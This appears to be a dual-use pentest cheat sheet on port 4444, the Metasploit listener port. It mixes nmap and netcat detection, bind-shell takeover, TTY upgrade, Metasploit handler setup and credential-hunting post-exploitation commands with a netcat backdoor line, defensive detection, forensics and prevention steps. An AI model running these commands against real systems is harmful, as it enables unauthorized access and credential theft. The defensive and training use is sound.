# METASPLOIT DEFAULT LISTENER (Port 4444/TCP)

## SERVICE OVERVIEW
```
Port 4444/TCP - Common Metasploit reverse shell listener port
- Default port for many reverse shells
- Often used in CTF challenges and penetration testing
- May indicate compromised system with active backdoor
- Not a legitimate service in production environments
```

## BANNER GRABBING & DETECTION
```bash
nmap -sV -p4444 <IP>                            # Service/Version detection
nc -nv <IP> 4444                                # Manual connection
telnet <IP> 4444                                # Alternative connection

# Check if it's a Meterpreter session
nc -nv <IP> 4444
# Type random input, check response
```

## NMAP ENUMERATION
```bash
# Basic scan
nmap -sV -p4444 <IP>                            # Version detection
nmap -p4444 --script banner <IP>                # Banner grab

# Combined scan
nmap -sV -p4444 -A <IP> -oA port_4444_scan
```

## COMMON SERVICES ON PORT 4444
```
1. Metasploit Meterpreter reverse shell
2. Netcat listener (bind shell)
3. Custom backdoor/RAT
4. Compromised system indicator
5. Development testing server (rare)
6. krb524d (Kerberos 5 to 4 ticket translator - very rare)
```

## IDENTIFY IF IT'S METASPLOIT
```bash
# Connect and check behavior
nc -nv <IP> 4444

# Metasploit Meterpreter characteristics:
# - No banner
# - Accepts binary input
# - May respond to Meterpreter commands

# Try Meterpreter commands (if it's a reverse connection endpoint)
# Note: If 4444 is listening, it's likely waiting for connection FROM attacker
```

## REVERSE VS BIND SHELL
```bash
# If port 4444 is OPEN (listening), it's likely a BIND shell
# Connect to it:
nc -nv <IP> 4444                                # Interactive shell?
rlwrap nc -nv <IP> 4444                         # With readline support

# If you get shell access:
whoami                                          # Identify user
id                                              # User privileges
uname -a                                        # System info
ip a                                            # Network config
pwd                                             # Current directory

# Common bind shell backdoors:
# - Netcat listener: nc -lvnp 4444 -e /bin/bash
# - Meterpreter bind shell
# - Custom backdoor/RAT
```

## EXPLOITATION (IF BACKDOOR)
```bash
# If port 4444 is a bind shell backdoor:

# 1. Connect
nc -nv <IP> 4444

# 2. Upgrade to interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 3. Background and setup proper TTY
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# 4. Enumerate system
whoami && id
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null
```

## METASPLOIT MULTI/HANDLER
```bash
# If you're the attacker setting up listener:
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 4444
exploit -j

# Or for bind shell connection:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST <target_IP>
set LPORT 4444
exploit
```

## DETECT BACKDOOR TYPE
```bash
# Send HTTP request (might be web-based backdoor)
curl -v http://<IP>:4444/
curl -v http://<IP>:4444/shell
curl -v http://<IP>:4444/cmd?cmd=whoami

# Send test commands
echo "whoami" | nc -nv <IP> 4444
echo "id" | nc -nv <IP> 4444
echo "uname -a" | nc -nv <IP> 4444

# Check for specific backdoors
# China Chopper: POST requests with "eval" parameter
curl -X POST http://<IP>:4444/ -d "pass=eval" -d "cmd=phpinfo();"

# Weevely: Specific cookie-based authentication
curl http://<IP>:4444/ -H "Cookie: auth=<hash>"
```

## VULNERABILITY SCANNING
```bash
# Check if it's a known vulnerable service
searchsploit port 4444
nmap -p4444 --script vuln <IP>

# krb524d (if detected)
searchsploit krb524
```

## COMMON MISCONFIGURATIONS
```
☐ Metasploit listener left running on production
☐ Bind shell backdoor from previous compromise
☐ No firewall blocking port 4444
☐ Backdoor accessible from external networks
☐ No monitoring/alerting for suspicious connections
☐ Compromised system not detected
☐ Default Metasploit port used (easily detected)
```

## QUICK WIN CHECKLIST
```
☐ Check if port 4444 is open
☐ Attempt to connect with netcat
☐ Test for shell access (whoami, id)
☐ Try common shell commands
☐ Upgrade to interactive shell if possible
☐ Enumerate system (users, network, processes)
☐ Check for privilege escalation vectors
☐ Identify backdoor type (Metasploit, netcat, custom)
☐ Document findings (IOC, timeline)
```

## ONE-LINER CONNECTION
```bash
# Quick connection test
nc -nv <IP> 4444 <<< "whoami"

# Interactive connection
rlwrap nc -nv <IP> 4444
```

## POST-EXPLOITATION (IF BACKDOOR)
```bash
# After connecting to bind shell:

# 1. Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Enumerate system
whoami
id
hostname
uname -a
cat /etc/os-release

# 3. Network enumeration
ip a
ip route
netstat -tulpn
ss -tulpn

# 4. User enumeration
cat /etc/passwd
cat /etc/group
w                                               # Who's logged in
last                                            # Login history

# 5. Check for credentials
cat /home/*/.bash_history
grep -r "password" /home/
find / -name "*.conf" 2>/dev/null | xargs grep -i "password"

# 6. Privilege escalation enumeration
sudo -l
find / -perm -4000 2>/dev/null                  # SUID binaries
cat /etc/crontab
systemctl list-timers

# 7. Persistence check
cat /etc/rc.local
crontab -l
cat /etc/systemd/system/*.service
```

## SECURITY IMPLICATIONS
```
RISKS:
- Active backdoor on system (critical!)
- Unauthorized access to system
- Data exfiltration possible
- Lateral movement to other systems
- Persistence mechanism may exist
- Compromised system acting as pivot point
- Potential data breach in progress

INDICATORS OF COMPROMISE:
- Port 4444 listening on system
- Unusual processes (nc, metasploit, unknown binaries)
- Outbound connections to suspicious IPs
- Modified system files
- New user accounts
- Suspicious cron jobs or startup scripts

IMMEDIATE ACTIONS:
- Isolate affected system from network
- Kill suspicious processes
- Check all running processes and network connections
- Review system logs for entry point
- Identify scope of compromise
- Change all credentials
- Restore from known good backup if available
- Conduct full forensic analysis
```

## DEFENSIVE DETECTION
```bash
# On Linux system, check for port 4444 listener:
netstat -tulpn | grep 4444
ss -tulpn | grep 4444
lsof -i :4444

# Check process listening on 4444
lsof -i :4444 -t                                # Get PID
ps aux | grep $(lsof -i :4444 -t)              # Process details

# Check for Metasploit processes
ps aux | grep -i metasploit
ps aux | grep -i meterpreter
ps aux | grep -E "nc|ncat|netcat"

# Check for suspicious outbound connections
netstat -tnp | grep ESTABLISHED
ss -tnp | grep ESTABLISHED

# Check startup/persistence
cat /etc/rc.local
ls -la /etc/systemd/system/
crontab -l
cat /var/spool/cron/crontabs/*
```

## FORENSICS & INVESTIGATION
```bash
# If you find port 4444 open on a system:

# 1. Identify the process
lsof -i :4444
netstat -tulpn | grep 4444

# 2. Check process details
ps aux | grep <PID>
ls -l /proc/<PID>/exe                           # Binary location
cat /proc/<PID>/cmdline                         # Command line
ls -l /proc/<PID>/fd/                           # File descriptors

# 3. Check network connections
lsof -p <PID> -i                                # Network connections
netstat -anp | grep <PID>

# 4. Check when process started
ls -l /proc/<PID>                               # Process start time
ps -o lstart,cmd -p <PID>

# 5. Dump process memory (advanced)
gcore <PID>                                     # Create core dump
strings core.<PID> | grep -i "password\|key"   # Search for credentials

# 6. Kill the backdoor
kill -9 <PID>
```

## PREVENTION
```
- Implement egress filtering (block outbound 4444)
- Use IDS/IPS to detect reverse shell traffic
- Monitor for processes listening on port 4444
- Baseline normal network behavior
- Regular vulnerability scanning
- Patch management
- Application whitelisting
- Network segmentation
- Security awareness training
- Incident response plan
```

## TOOLS
```bash
# Netcat
nc -nv <IP> 4444
rlwrap nc -nv <IP> 4444

# Nmap
nmap -sV -p4444 <IP>

# Metasploit
use exploit/multi/handler
set PAYLOAD <appropriate_payload>
set RHOST <IP>
set LPORT 4444
exploit

# Forensics
lsof -i :4444
netstat -tulpn | grep 4444
```

## ALTERNATIVE COMMON BACKDOOR PORTS
```
Port 4444 - Metasploit default
Port 4445 - Metasploit alternative
Port 31337 - "eleet" backdoor
Port 12345 - NetBus
Port 1234 - Common backdoor
Port 5555 - Common reverse shell
Port 8080 - HTTP backdoor
Port 9999 - Common backdoor
```
